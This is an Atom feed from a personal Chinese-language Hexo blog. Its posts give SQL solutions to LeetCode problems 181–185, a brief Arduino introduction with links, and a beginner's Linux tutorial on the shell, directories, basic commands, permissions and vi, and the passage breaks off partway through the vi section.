<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>只为不凡而来</title>
  <subtitle>小智的世界</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-05-22T09:17:04.103Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>wuduozhi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>LeetCode|SQL</title>
    <link href="http://yoursite.com/2018/05/22/LeetCode-SQL/"/>
    <id>http://yoursite.com/2018/05/22/LeetCode-SQL/</id>
    <published>2018-05-22T15:23:52.000Z</published>
    <updated>2018-05-22T09:17:04.103Z</updated>
    
    <content type="html"><![CDATA[<h3 id="leetcode-181-Employees-Earning-More-Than-Their-Managers"><a href="#leetcode-181-Employees-Earning-More-Than-Their-Managers" class="headerlink" title="leetcode 181 Employees Earning More Than Their Managers"></a><a href="https://leetcode-cn.com/problems/employees-earning-more-than-their-managers/description/" target="_blank" rel="external">leetcode 181 Employees Earning More Than Their Managers</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Employee 表包含所有员工，他们的经理也属于员工。每个员工都有一个 Id，此外还有一列对应员工的经理的 Id。</div><div class="line"></div><div class="line">+----+-------+--------+-----------+</div><div class="line">| Id | Name  | Salary | ManagerId |</div><div class="line">+----+-------+--------+-----------+</div><div class="line">| 1  | Joe   | 70000  | 3         |</div><div class="line">| 2  | Henry | 80000  | 4         |</div><div class="line">| 3  | Sam   | 60000  | NULL      |</div><div class="line">| 4  | Max   | 90000  | NULL      |</div><div class="line">+----+-------+--------+-----------+</div><div class="line"></div><div class="line">给定 Employee 表，编写一个 SQL 查询，该查询可以获取收入超过他们经理的员工的姓名。在上面的表格中，Joe 是唯一一个收入超过他的经理的员工。</div><div class="line"></div><div class="line">+----------+</div><div class="line">| Employee |</div><div class="line">+----------+</div><div class="line">| Joe      |</div><div class="line">+----------+</div></pre></td></tr></table></figure>
<p>MySQL:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">SELECT</div><div class="line">	E. NAME Employee</div><div class="line">FROM</div><div class="line">	Employee E,</div><div class="line">	Employee M</div><div class="line">WHERE</div><div class="line">	E.ManagerId = M.Id</div><div class="line">AND E.Salary &gt; M.salary;</div></pre></td></tr></table></figure></p>
<h4 id="leetcode-182-Duplicate-Emails"><a href="#leetcode-182-Duplicate-Emails" class="headerlink" title="leetcode 182 Duplicate Emails"></a><a href="https://leetcode-cn.com/problems/duplicate-emails/description/" target="_blank" rel="external">leetcode 182 Duplicate Emails</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">编写一个 SQL 查询，查找 Person 表中所有重复的电子邮箱。</div><div class="line"></div><div class="line">示例：</div><div class="line"></div><div class="line">+----+---------+</div><div class="line">| Id | Email   |</div><div class="line">+----+---------+</div><div class="line">| 1  | a@b.com |</div><div class="line">| 2  | c@d.com |</div><div class="line">| 3  | a@b.com |</div><div class="line">+----+---------+</div><div class="line"></div><div class="line">根据以上输入，你的查询应返回以下结果：</div><div class="line"></div><div class="line">+---------+</div><div class="line">| Email   |</div><div class="line">+---------+</div><div class="line">| a@b.com |</div><div class="line">+---------+</div><div class="line"></div><div class="line">说明：所有电子邮箱都是小写字母。</div></pre></td></tr></table></figure>
<p>My Solution</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">SELECT</div><div class="line">	Email</div><div class="line">FROM</div><div class="line">	Person</div><div class="line">GROUP BY</div><div class="line">	Email</div><div class="line">HAVING</div><div class="line">	count(*) &gt; 1;</div></pre></td></tr></table></figure>
<h4 id="Leetcode-183-Customers-Who-Never-Order"><a href="#Leetcode-183-Customers-Who-Never-Order" class="headerlink" title="Leetcode 183 Customers Who Never Order"></a><a href="https://leetcode-cn.com/problems/customers-who-never-order/description/" target="_blank" rel="external">Leetcode 183 Customers Who Never Order</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">某网站包含两个表，Customers 表和 Orders 表。编写一个 SQL 查询，找出所有从不订购任何东西的客户。</div><div class="line"></div><div class="line">Customers 表：</div><div class="line"></div><div class="line">+----+-------+</div><div class="line">| Id | Name  |</div><div class="line">+----+-------+</div><div class="line">| 1  | Joe   |</div><div class="line">| 2  | Henry |</div><div class="line">| 3  | Sam   |</div><div class="line">| 4  | Max   |</div><div class="line">+----+-------+</div><div class="line"></div><div class="line">Orders 表：</div><div class="line"></div><div class="line">+----+------------+</div><div class="line">| Id | CustomerId |</div><div class="line">+----+------------+</div><div class="line">| 1  | 3          |</div><div class="line">| 2  | 1          |</div><div class="line">+----+------------+</div><div class="line"></div><div class="line">例如给定上述表格，你的查询应返回：</div><div class="line"></div><div class="line">+-----------+</div><div class="line">| Customers |</div><div class="line">+-----------+</div><div class="line">| Henry     |</div><div class="line">| Max       |</div><div class="line">+-----------+</div></pre></td></tr></table></figure>
<p>My solution：</p>
<ul>
<li>使用not in:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">SELECT</div><div class="line">	NAME AS Customers</div><div class="line">FROM</div><div class="line">	Customers c</div><div class="line">WHERE</div><div class="line">	c.Id NOT IN (</div><div class="line">		SELECT</div><div class="line">			CustomerId</div><div class="line">		FROM</div><div class="line">			Orders o</div><div class="line">	);</div></pre></td></tr></table></figure>
<ul>
<li>使用not esists: </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">SELECT</div><div class="line">	NAME AS Customers</div><div class="line">FROM</div><div class="line">	Customers c</div><div class="line">WHERE</div><div class="line">	NOT EXISTS (</div><div class="line">		SELECT</div><div class="line">			CustomerId</div><div class="line">		FROM</div><div class="line">			Orders o</div><div class="line">		WHERE</div><div class="line">			o.CustomerId = c.id</div><div class="line">	);</div></pre></td></tr></table></figure>
<ul>
<li>使用left join:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">SELECT</div><div class="line">	NAME AS Customers</div><div class="line">FROM</div><div class="line">	Customers c</div><div class="line">LEFT JOIN Orders o ON c.Id = o.CustomerId</div><div class="line">WHERE</div><div class="line">	o.Id IS NULL;</div></pre></td></tr></table></figure>
<h3 id="Leetcode-184-Department-Highest-Salary"><a href="#Leetcode-184-Department-Highest-Salary" class="headerlink" title="Leetcode 184 Department Highest Salary"></a><a href="https://leetcode-cn.com/problems/department-highest-salary/description/" target="_blank" rel="external">Leetcode 184 Department Highest Salary</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">Employee 表包含所有员工信息，每个员工有其对应的 Id, salary 和 department Id。</div><div class="line"></div><div class="line">+----+-------+--------+--------------+</div><div class="line">| Id | Name  | Salary | DepartmentId |</div><div class="line">+----+-------+--------+--------------+</div><div class="line">| 1  | Joe   | 70000  | 1            |</div><div class="line">| 2  | Henry | 80000  | 2            |</div><div class="line">| 3  | Sam   | 60000  | 2            |</div><div class="line">| 4  | Max   | 90000  | 1            |</div><div class="line">+----+-------+--------+--------------+</div><div class="line"></div><div class="line">Department 表包含公司所有部门的信息。</div><div class="line"></div><div class="line">+----+----------+</div><div class="line">| Id | Name     |</div><div class="line">+----+----------+</div><div class="line">| 1  | IT       |</div><div class="line">| 2  | Sales    |</div><div class="line">+----+----------+</div><div class="line"></div><div class="line">编写一个 SQL 查询，找出每个部门工资最高的员工。例如，根据上述给定的表格，Max 在 IT 部门有最高工资，Henry 在 Sales 部门有最高工资。</div><div class="line"></div><div class="line">+------------+----------+--------+</div><div class="line">| Department | Employee | Salary |</div><div class="line">+------------+----------+--------+</div><div class="line">| IT         | Max      | 90000  |</div><div class="line">| Sales      | Henry    | 80000  |</div><div class="line">+------------+----------+--------+</div></pre></td></tr></table></figure>
<p>首先使用临时表t查询出每一个部门的最高薪水，然后使用薪水值和部门Id与雇员表Employee做内连接，再通过部门Id与部门表Department做内连接。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">SELECT</div><div class="line">	d.`Name` AS Department,</div><div class="line">	e. NAME AS Employee,</div><div class="line">	t.Salary</div><div class="line">FROM</div><div class="line">	Employee e</div><div class="line">INNER JOIN (</div><div class="line">	SELECT</div><div class="line">		DepartmentId,</div><div class="line">		max(Salary) AS Salary</div><div class="line">	FROM</div><div class="line">		Employee</div><div class="line">	GROUP BY</div><div class="line">		DepartmentId</div><div class="line">) t ON e.DepartmentId = t.DepartmentId</div><div class="line">AND e.Salary = t.Salary</div><div class="line">INNER JOIN Department d ON d.id = t.DepartmentId;</div></pre></td></tr></table></figure>
<h3 id="Leetcode-185-Department-Top-Three-Salaries"><a href="#Leetcode-185-Department-Top-Three-Salaries" class="headerlink" title="Leetcode 185 Department Top Three Salaries"></a><a href="https://leetcode-cn.com/problems/department-top-three-salaries/description/" target="_blank" rel="external">Leetcode 185 Department Top Three Salaries</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">Employee 表包含所有员工信息，每个员工有其对应的 Id, salary 和 department Id 。</div><div class="line"></div><div class="line">+----+-------+--------+--------------+</div><div class="line">| Id | Name  | Salary | DepartmentId |</div><div class="line">+----+-------+--------+--------------+</div><div class="line">| 1  | Joe   | 70000  | 1            |</div><div class="line">| 2  | Henry | 80000  | 2            |</div><div class="line">| 3  | Sam   | 60000  | 2            |</div><div class="line">| 4  | Max   | 90000  | 1            |</div><div class="line">| 5  | Janet | 69000  | 1            |</div><div class="line">| 6  | Randy | 85000  | 1            |</div><div class="line">+----+-------+--------+--------------+</div><div class="line"></div><div class="line">Department 表包含公司所有部门的信息。</div><div class="line"></div><div class="line">+----+----------+</div><div class="line">| Id | Name     |</div><div class="line">+----+----------+</div><div class="line">| 1  | IT       |</div><div class="line">| 2  | Sales    |</div><div class="line">+----+----------+</div><div class="line"></div><div class="line">编写一个 SQL 查询，找出每个部门工资前三高的员工。例如，根据上述给定的表格，查询结果应返回：</div><div class="line"></div><div class="line">+------------+----------+--------+</div><div class="line">| Department | Employee | Salary |</div><div class="line">+------------+----------+--------+</div><div class="line">| IT         | Max      | 90000  |</div><div class="line">| IT         | Randy    | 85000  |</div><div class="line">| IT         | Joe      | 70000  |</div><div class="line">| Sales      | Henry    | 80000  |</div><div class="line">| Sales      | Sam      | 60000  |</div><div class="line">+------------+----------+--------+</div></pre></td></tr></table></figure>
<p>My Solution</p>
<ul>
<li>使用变量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">SELECT</div><div class="line">	d. NAME AS Department,</div><div class="line">	t. NAME AS Employee,</div><div class="line">	Salary</div><div class="line">FROM</div><div class="line">	(</div><div class="line">		SELECT</div><div class="line">			DepartmentId,</div><div class="line">			NAME,</div><div class="line">			Salary,</div><div class="line">			@rank :=</div><div class="line">		IF (</div><div class="line">			@prevDeptId != DepartmentId,</div><div class="line">			1,</div><div class="line"></div><div class="line">			IF (</div><div class="line">				@prevSalary = Salary,</div><div class="line">				@rank,</div><div class="line">				@rank + 1</div><div class="line">			)</div><div class="line">		) AS Rank,</div><div class="line">		@prevDeptId := DepartmentId AS prevDeptId,</div><div class="line">		@prevSalary := Salary AS prevSalary</div><div class="line">	FROM</div><div class="line">		Employee e,</div><div class="line">		(</div><div class="line">			SELECT</div><div class="line">				@rank := 0,</div><div class="line">				@prevDeptId := NULL,</div><div class="line">				@prevSalary := NULL</div><div class="line">		) r</div><div class="line">	ORDER BY</div><div class="line">		DepartmentId ASC,</div><div class="line">		Salary DESC</div><div class="line">	) t</div><div class="line">INNER JOIN Department d ON t.DepartmentId = d.Id</div><div class="line">WHERE</div><div class="line">	t.rank &lt;= 3;</div></pre></td></tr></table></figure>
<ul>
<li>不使用变量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">SELECT</div><div class="line">	D. NAME AS Department,</div><div class="line">	E. NAME AS Employee,</div><div class="line">	E.Salary AS Salary</div><div class="line">FROM</div><div class="line">	Employee E,</div><div class="line">	Department D</div><div class="line">WHERE</div><div class="line">	(</div><div class="line">		SELECT</div><div class="line">			count(DISTINCT(Salary))</div><div class="line">		FROM</div><div class="line">			Employee</div><div class="line">		WHERE</div><div class="line">			DepartmentId = E.DepartmentId</div><div class="line">		AND Salary &gt; E.Salary</div><div class="line">	) &lt; 3</div><div class="line">AND E.DepartmentId = D.Id</div><div class="line">ORDER BY</div><div class="line">	E.DepartmentId,</div><div class="line">	E.Salary DESC;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;leetcode-181-Employees-Earning-More-Than-Their-Managers&quot;&gt;&lt;a href=&quot;#leetcode-181-Employees-Earning-More-Than-Their-Managers&quot; class=&quot;h
    
    </summary>
    
      <category term="LeetCode" scheme="http://yoursite.com/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="http://yoursite.com/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>干货|Arduino初体验</title>
    <link href="http://yoursite.com/2018/05/22/%E5%B9%B2%E8%B4%A7-Arduino%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://yoursite.com/2018/05/22/干货-Arduino初体验/</id>
    <published>2018-05-21T23:38:53.000Z</published>
    <updated>2018-05-21T16:19:15.820Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Arduino是一款便捷灵活、方便上手的开源电子原型平台。主要包含两个主要的部分：硬件部分是可以用来做电路连接的各种型号的Arduino开发板；软件则是Arduino IDE(程序开发环境)，你只要在IDE中编写程序代码，将程序上载到Arduino后，程序便会告诉Arduino要做些什么。Arduino能通过各种各样的传感器来感知环境，通过控制灯光、马达和其他的装置来反馈、影响环境。Arduino的简易性，丰富的扩展板和成熟的开源社区使之成为开源硬件和Maker Movement的中流砥柱。</p>
<h3 id="找到的一些干货"><a href="#找到的一些干货" class="headerlink" title="找到的一些干货"></a>找到的一些干货</h3><p><a href="http://www.naozhendang.com/s/learning-arduino" target="_blank" rel="external">干货教程</a><br><a href="https://www.arduino.cc/reference/en/" target="_blank" rel="external">官网教程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;Arduino是一款便捷灵活、方便上手的开源电子原型平台。主要包含两个主要的部分：硬件部分是可以用来做电路连接的各种型号的Arduino开发
    
    </summary>
    
      <category term="干货" scheme="http://yoursite.com/categories/%E5%B9%B2%E8%B4%A7/"/>
    
    
      <category term="干货" scheme="http://yoursite.com/tags/%E5%B9%B2%E8%B4%A7/"/>
    
  </entry>
  
  <entry>
    <title>Linux|Linux的那些事</title>
    <link href="http://yoursite.com/2018/05/16/Linux-Linux%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>http://yoursite.com/2018/05/16/Linux-Linux的那些事/</id>
    <published>2018-05-16T10:13:29.000Z</published>
    <updated>2018-05-18T03:26:30.286Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Linux的基础知识"><a href="#Linux的基础知识" class="headerlink" title="Linux的基础知识"></a>Linux的基础知识</h3><p>Linux系统的组成：</p>
<ul>
<li>linux内核（linus 团队管理）</li>
<li>shell：用户与内核交互的接口</li>
<li>文件系统：ext3、ext4等，windows 有 fat32 、ntfs</li>
<li>第三方应用软件</li>
</ul>
<h4 id="Shell的基本知识"><a href="#Shell的基本知识" class="headerlink" title="Shell的基本知识"></a>Shell的基本知识</h4><p><strong>Shell是系统的用户界面，提供了用户与内核进行交互操作的一种接口(命令解释器)。</strong></p>
<p>Shell可以执行：</p>
<ul>
<li>内部命令</li>
<li>应用程序</li>
<li>shell脚本</li>
</ul>
<p><img src="/images/linux的那些事-01.png" alt="shell"></p>
<p>于是乎，我们利用Shell就可以干下面这些事了：</p>
<ul>
<li>命令行解释(这是用得最多的！)</li>
<li>命令的多种执行顺序</li>
<li>通配符（ wild-card characters ）</li>
<li>命令补全、别名机制、命令历史</li>
<li>I/O重定向（ Input/output redirection ）</li>
<li>管道（ pipes ）</li>
<li>命令替换（ 或$( ) ）</li>
<li>Shell编程语言（ Shell Script ）</li>
</ul>
<p>常见的shell版本：</p>
<p><img src="/images/linux的那些事-02.png" alt="shell"></p>
<h4 id="Linux基本目录结构"><a href="#Linux基本目录结构" class="headerlink" title="Linux基本目录结构"></a>Linux基本目录结构</h4><p><img src="/images/linux的那些事-03.png" alt="目录结构"></p>
<p>Linux 文件系统是一个目录树的结构，文件系统结构从一个根目录开始，根目录下可以有任意多个文件和子目录，子目录中又可以有任意多个文件和子目录。</p>
<table>
<thead>
<tr>
<th>目录名称</th>
<th>一般作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>bin</td>
<td>存放二进制可执行文件(ls,cat,mkdir等)</td>
</tr>
<tr>
<td>boot</td>
<td>存放用于系统引导时使用的各种文件</td>
</tr>
<tr>
<td>dev</td>
<td>用于存放设备文件</td>
</tr>
<tr>
<td>etc</td>
<td>存放系统配置文件</td>
</tr>
<tr>
<td>home</td>
<td>存放所有用户文件的根目录</td>
</tr>
<tr>
<td>lib</td>
<td>存放跟文件系统中的程序运行所需要的共享库及内核模块</td>
</tr>
<tr>
<td>mnt</td>
<td>系统管理员安装临时文件系统的安装点</td>
</tr>
<tr>
<td>opt</td>
<td>额外安装的可选应用程序包所放置的位置</td>
</tr>
<tr>
<td>proc</td>
<td>虚拟文件系统，存放当前内存的映射</td>
</tr>
<tr>
<td>root</td>
<td>超级用户目录</td>
</tr>
<tr>
<td>sbin</td>
<td>存放二进制可执行文件，只有root才能访问</td>
</tr>
<tr>
<td>tmp</td>
<td>用于存放各种临时文件</td>
</tr>
<tr>
<td>usr</td>
<td>用于存放系统应用程序，比较重要的目录/usr/local 本地管理员软件安装目录</td>
</tr>
<tr>
<td>var</td>
<td>用于存放运行时需要改变数据的文件</td>
</tr>
</tbody>
</table>
<h4 id="命令基本格式"><a href="#命令基本格式" class="headerlink" title="命令基本格式"></a>命令基本格式</h4><p><code>cmd [options] [arguments]</code>，options称为选项，arguments称为参数。选项和参数都作为Shell命令执行时的输入，它们之间用空格分隔开。同时，<strong>Linux是区分大小写的</strong>。</p>
<p>一般来说，后面跟的选项如果单字符选项前使用一个<code>减号-</code>,单词选项前使用<code>两个减号--</code>。</p>
<p>在Linux中，可执行的文件也进行了分类：</p>
<ul>
<li>内置命令：出于效率的考虑，将一些常用命令的解释程序构造在Shell内部。</li>
<li>外置命令：存放在/bin、/sbin目录下的命令</li>
<li>实用程序：存放在/usr/bin、/usr/sbin、/usr/share、/usr/local/bin等目录下的实用程序</li>
<li>用户程序：用户程序经过编译生成可执行文件后，可作为Shell命令运行</li>
<li>Shell脚本：由Shell语言编写的批处理文件，可作为Shell命令运行</li>
</ul>
<h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><p>通配符和正则表达式还是不同的，不要混为一谈了。</p>
<ul>
<li>*：匹配任何字符和任何数目的字符</li>
<li>?：匹配单一数目的任何字符</li>
<li>[]：匹配 [] 之内的任意一个字符</li>
<li>[! ]：匹配除了[! ]之外的任意一个字符，!表示非的意思</li>
</ul>
<h4 id="文件的类型"><a href="#文件的类型" class="headerlink" title="文件的类型"></a>文件的类型</h4><p>在Linux下文件的类型有这么多：</p>
<ul>
<li>普通文件<code>-</code></li>
<li>目录 <code>d</code></li>
<li>符号链接 <code>l</code><ul>
<li>硬链接： 与普通文件没什么不同，inode 都指向同一个文件在硬盘中的区块</li>
<li>软链接： 保存了其代表的文件的绝对路径，是另外一种文件，在硬盘上有独立的区块，访问时替换自身路径(简单地理解为 Windows 中常见的快捷方式)。</li>
</ul>
</li>
<li>字符设备文件 <code>c</code></li>
<li>块设备文件 <code>b</code></li>
<li>套接字 <code>s</code></li>
<li>命名管道 <code>p</code></li>
</ul>
<h3 id="常用的命令"><a href="#常用的命令" class="headerlink" title="常用的命令"></a>常用的命令</h3><p>由于使用Linux的过程中，基本都是通过命令进行操作，所以还是有必要记忆一些常用的命令，比如文件夹、文件的操作，怎么去编辑文件…</p>
<h4 id="常用的文件、目录操作命令"><a href="#常用的文件、目录操作命令" class="headerlink" title="常用的文件、目录操作命令"></a>常用的文件、目录操作命令</h4><p>这是我们使用得最多的命令了，Linux最基础的命令！</p>
<ul>
<li>可用 <code>pwd</code> 命令查看用户的当前目录</li>
<li>可用 <code>cd</code> 命令来切换目录</li>
<li><code>.</code>表示当前目录</li>
<li><code>..</code> 表示当前目录的上一级目录（父目录）</li>
<li><code>-</code>表示用 cd 命令切换目录前所在的目录</li>
<li><code>~</code>表示用户主目录的绝对路径名</li>
</ul>
<p><strong>tips:输入命令的时候要常用<code>tab键</code>来补全</strong></p>
<ul>
<li><code>ls</code>：显示文件或目录信息</li>
<li><code>mkdir</code>：当前目录下创建一个空目录</li>
<li><code>rmdir</code>：要求目录为空</li>
<li><code>touch</code>：生成一个空文件或更改文件的时间</li>
<li><code>cp</code>：复制文件或目录</li>
<li><code>mv</code>：移动文件或目录、文件或目录改名</li>
<li><code>rm</code>：删除文件或目录</li>
<li><code>ln</code>：建立链接文件</li>
<li><code>find</code>：查找文件</li>
<li><code>file/stat</code>：查看文件类型或文件属性信息</li>
<li><code>cat</code>：查看文本文件内容</li>
<li><code>more</code>：可以分页看</li>
<li><code>less</code>：不仅可以分页，还可以方便地搜索，回翻等操作</li>
<li><code>tail -10</code>： 查看文件的尾部的10行</li>
<li><code>head -20</code>：查看文件的头部20行</li>
<li><code>echo</code> ：把内容重定向到指定的文件中 ，有则打开，无则创建</li>
<li><code>管道命令 |</code> ：将前面的结果给后面的命令，例如：ls -la | wc ，将ls的结果加油wc命令来统计字数</li>
<li><code>重定向 &gt; 是覆盖模式，&gt;&gt; 是追加模式</code> :例如：echo “Java3y,zhen de hen xihuan ni” &gt; qingshu.txt 把左边的输出放到右边的文件里去</li>
</ul>
<p>学了这些命令我们能干嘛？其实就是在Windows下复制文件、粘贴文件、创建文件、查看文件这几种~~~</p>
<h4 id="文件打包和压缩命令"><a href="#文件打包和压缩命令" class="headerlink" title="文件打包和压缩命令"></a>文件打包和压缩命令</h4><p>接下来介绍如何在Linux下压缩和解压文件。</p>
<p><img src="/images/linux的那些事-04.png" alt="压缩解压"></p>
<p><img src="/images/linux的那些事-05.png" alt="压缩解压"></p>
<h4 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h4><p> Linux系统上的所有的文件和目录都有权限<br> 有三种类别的权限：owner，group和other<br> 每个类别都有3个权限位：read, write, execute (rwx)</p>
<p>对于普通文件:</p>
<ul>
<li>r =&gt; Can look at the contents of a file</li>
<li>w =&gt; Can change or delete the contents of a file</li>
<li>x =&gt; Can execute the file (r is also needed if a script)</li>
</ul>
<p>对于目录文件:</p>
<ul>
<li>r =&gt; Can list the files within a directory (ls)</li>
<li>w =&gt; Can <strong>create/remove</strong> files in the directory</li>
<li>x =&gt; Can change into the directory and access the files within (cd)</li>
</ul>
<h5 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h5><p> 修改文件权限用chmod 命令<br> 修改权限有两种方式：</p>
<pre><code>1. 符号表示的权限(Symbolic Notation)
2. 八进制表示的权限(Octal Notation)
</code></pre><p> 必须是文件或目录的所有者才能修改其访问权限<br> root 用户可以修改任何文件和目录的权限</p>
<p><img src="/images/linux的那些事-07.png" alt="文件权限"></p>
<p><img src="/images/linux的那些事-08.png" alt="文件权限"></p>
<h3 id="VI编辑器"><a href="#VI编辑器" class="headerlink" title="VI编辑器"></a>VI编辑器</h3><p><code>vi</code>是 “Visual interface” 的简称，它可以执行输出、删除、查找、替换、块操作等众多文本操作，而且用户可以根据自己的需要对其进行定制，这是其他编辑程序所没有的。</p>
<p><img src="/images/linux的那些事-06.png" alt="vi编辑器"></p>
<p><strong>普通模式</strong>：</p>
<ul>
<li><code>G</code> 用于直接跳转到文件尾</li>
<li><code>ZZ</code>用于存盘退出Vi</li>
<li><code>ZQ</code> 用于不存盘退出Vi</li>
<li><code>/和？</code> 用于查找字符串</li>
<li><code>n</code>继续查找下一个</li>
<li><code>yy</code> 复制一行</li>
<li><code>p</code>粘帖在下一行，<code>P</code>粘贴在前一行</li>
<li><code>dd</code> 剪切一行</li>
<li><code>x</code> 删除光标所在的字符</li>
<li><code>u</code> 取消上一次编辑操作（undo）</li>
</ul>
<p><strong>编辑模式</strong>：在编辑模式下，用户输入的任何字符都被vim当做文件内容保存起来，并将其显示在屏幕上。</p>
<p><strong>命令行模式</strong>：Normal 模式下，用户按冒号 :即可进入 Command 模式，此时 vim 会在显示窗口的最后一行 (屏幕的最后一行) 显示一个 “:” 作为 Command 模式的提示符，等待输入命令。</p>
<ul>
